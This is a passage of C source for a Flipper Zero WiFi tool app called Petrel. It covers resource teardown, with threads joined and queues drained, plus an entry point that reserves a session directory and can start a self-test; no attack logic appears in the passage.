    uart_helper_free(app->uart_helper);
    // Now the queue can go - and it MUST, or every app run leaks the 64-slot ring plus every
    // FuriString still parked in it. The old comment here claimed the opposite; checked against the
    // firmware source, view_dispatcher_free() does NOT drain events or run the tick - it removes
    // the view port, frees its own input/event queues and the dispatcher. The tick is armed once
    // inside view_dispatcher_run() and stops firing when the loop returns, which is before app_free
    // is reached, and uart_helper_free() above has already joined the only producer. So detach the
    // tick anyway (cheap, makes the intent explicit), drop what is inside, then free the queue.
    view_dispatcher_set_tick_event_callback(app->view_dispatcher, NULL, 0);
    FuriString* leftover;
    while(furi_message_queue_get(app->uart_lines, &leftover, 0) == FuriStatusOk) {
        furi_string_free(leftover);
    }
    furi_message_queue_free(app->uart_lines);
    // Last, now that every producer is gone (all timers stopped above, the UART worker joined in
    // uart_helper_free, and the dispatcher's tick can no longer fire because its loop returned).
    // Stop the storage worker BEFORE anything else is torn down. Its queue is drained and freed
    // here rather than waited on: pending jobs are dropped, never awaited forever.
    // Let the worker finish what it already accepted (bounded): closing used to free queued
    // captures/reports without writing them or saying so.
    for(int i = 0; i < 500; i++) {
        furi_mutex_acquire(storage_mutex, FuriWaitForever);
        bool empty = (storage_tail == storage_head);
        furi_mutex_release(storage_mutex);
        if(empty) break;
        furi_delay_ms(10);
    }
    storage_run = false;
    if(storage_thread) {
        furi_thread_join(storage_thread);
        furi_thread_free(storage_thread);
        storage_thread = NULL;
    }
    // Producers are stopped (every timer above, the UART worker in uart_helper_free, the tick loop
    // has returned), so this is the last word: flush whatever is still in the ring, including the
    // self-test's completion record, instead of leaving it to be freed unseen.
    for(int i = 0; i < 50 && diag_flushed != diag_head; i++) diag_flush();   // drain the whole ring
    furi_mutex_acquire(storage_mutex, FuriWaitForever);
    while(storage_tail != storage_head) {
        free(storage_q[storage_tail].data);
        storage_tail = (uint8_t)((storage_tail + 1) % STORAGE_Q);
    }
    furi_mutex_release(storage_mutex);
    furi_mutex_free(storage_mutex);
    storage_mutex = NULL;
    furi_mutex_free(post_mutex);
    furi_mutex_free(diag_mutex);
    diag_mutex = NULL;
    post_mutex = NULL;

    view_dispatcher_remove_view(app->view_dispatcher, mainMenuView);
    view_dispatcher_remove_view(app->view_dispatcher, scannedWifisView);
    view_dispatcher_remove_view(app->view_dispatcher, bssidTextInputView);
    view_dispatcher_remove_view(app->view_dispatcher, loadingView);
    view_dispatcher_remove_view(app->view_dispatcher, wifiInfoView);
    view_dispatcher_remove_view(app->view_dispatcher, configAttackView);
    view_dispatcher_remove_view(app->view_dispatcher, evilCredsView);
    view_dispatcher_remove_view(app->view_dispatcher, aPmacAddresView);
    view_dispatcher_remove_view(app->view_dispatcher, beaconListView);
    view_dispatcher_remove_view(app->view_dispatcher, beaconInfoView);
    view_dispatcher_remove_view(app->view_dispatcher, configAPView);
    view_dispatcher_remove_view(app->view_dispatcher, helpView);
    view_dispatcher_remove_view(app->view_dispatcher, popupView);
    view_dispatcher_remove_view(app->view_dispatcher, apNameTextInputView);
    view_dispatcher_remove_view(app->view_dispatcher, apPasswordTextInputView);
    view_dispatcher_remove_view(app->view_dispatcher, cardMenuView);
    view_dispatcher_remove_view(app->view_dispatcher, pmfView);
    view_dispatcher_remove_view(app->view_dispatcher, toolsListView);
    view_dispatcher_remove_view(app->view_dispatcher, channelMapView);
    view_dispatcher_remove_view(app->view_dispatcher, busyView);
    view_dispatcher_remove_view(app->view_dispatcher, settingsView);

    scene_manager_free(app->scene_manager);

    view_dispatcher_free(app->view_dispatcher); //Some events whre not processed

    menu_free(app->menu);
    submenu_free(app->submenu);
    variable_item_list_free(app->variableList);
    byte_input_free(app->byteInput);
    widget_free(app->widget);
    view_free(app->cardView);
    view_free(app->chanMapView);
    view_free(app->busyView);
    text_input_free(app->text_input);
    loading_free(app->loading);
    app->wifiCount = 0;
    app->rickIndex = 0;

    free(app->ssidAP);
    free(app->passwordAP);
    furi_record_close(RECORD_GUI);
    furi_hal_power_disable_otg();
    free(app);
}

int32_t Petrel_app(void* p) {
    FURI_LOG_D(TAG, __func__);

    // Reserve the session before app_alloc starts storage/UART producers (D6-1, architect).
    // mkdir is the reservation: an existing directory is never reused, so two launches in the same
    // second (or a relaunch after a crash) can no longer write into one directory.
    {
        DateTime dt;
        furi_hal_rtc_get_datetime(&dt);
        char base[32];   // worst-case year: %04d can exceed 4 digits without truncating
        snprintf(
            base,
            sizeof(base),
            "%04d-%02d-%02d_%02d-%02d-%02d",
            dt.year,
            dt.month,
            dt.day,
            dt.hour,
            dt.minute,
            dt.second);

        Storage* st = furi_record_open(RECORD_STORAGE);
        FS_Error err = storage_common_mkdir(st, "/ext/petrel");
        bool ready = (err == FSE_OK || err == FSE_EXIST);
        if(ready) {
            err = storage_common_mkdir(st, "/ext/petrel/sessions");
            ready = (err == FSE_OK || err == FSE_EXIST);
        }

        bool reserved = false;
        if(ready) {
            for(unsigned suffix = 0; suffix < 1000; suffix++) {
                if(suffix == 0) {
                    snprintf(petrel_session_id, sizeof(petrel_session_id), "%s", base);
                } else {
                    snprintf(
                        petrel_session_id,
                        sizeof(petrel_session_id),
                        "%s_%03u",
                        base,
                        suffix);
                }
                char dir[96];
                snprintf(dir, sizeof(dir), "/ext/petrel/sessions/%s", petrel_session_id);
                err = storage_common_mkdir(st, dir);
                if(err == FSE_OK) {
                    reserved = true;
                    break;
                }
                if(err != FSE_EXIST) break;
            }
        }
        furi_record_close(RECORD_STORAGE);
        if(!reserved) {
            // No evidence directory means the run cannot be attributed later - fail BEFORE any
            // worker, UART traffic or board power-up, rather than overwrite someone else's.
            FURI_LOG_E(TAG, "Cannot reserve session directory");
            return -1;
        }
    }

    Petrel* app = app_alloc();
    petrel_settings_load();
    Expansion* expansion = furi_record_open(RECORD_EXPANSION);
    expansion_disable(expansion);
    if(!furi_hal_power_is_otg_enabled()) furi_hal_power_enable_otg();
    Gui* gui = furi_record_open(RECORD_GUI);
    // RPC'siz ekran goruntusu: her kare /ext/petrel/shot.hex'e yazilir (tools/flip_shot.py PNG'ye cevirir).
    gui_add_framebuffer_callback(gui, petrel_fb_callback, app);
    view_dispatcher_attach_to_gui(app->view_dispatcher, gui, ViewDispatcherTypeFullscreen);
    scene_manager_next_scene(app->scene_manager, mainMenuScene);
    // Deterministic diagnostic entry point (architect, D.5): start the self-test from the app
    // argument, so a traversal run needs no menu navigation at all - the Settings row could not be
    // reached reliably with injected keys. Exact match, so no other argument can start it. This
    // exercises the scene transitions; it does NOT test that the Settings row works.
    if(p && strcmp((const char*)p, "selftest") == 0) {
        st_lap = 0;
        st_step = 0;
        st_due = furi_get_tick();
        st_active = true;
        diag(7, 1u, (uint32_t)ST_LAPS);
    }
    view_dispatcher_run(app->view_dispatcher);
    gui_remove_framebuffer_callback(gui, petrel_fb_callback, app);

    app_free(app);
    expansion_enable(expansion);
    furi_record_close(RECORD_EXPANSION);

    return 0;
}
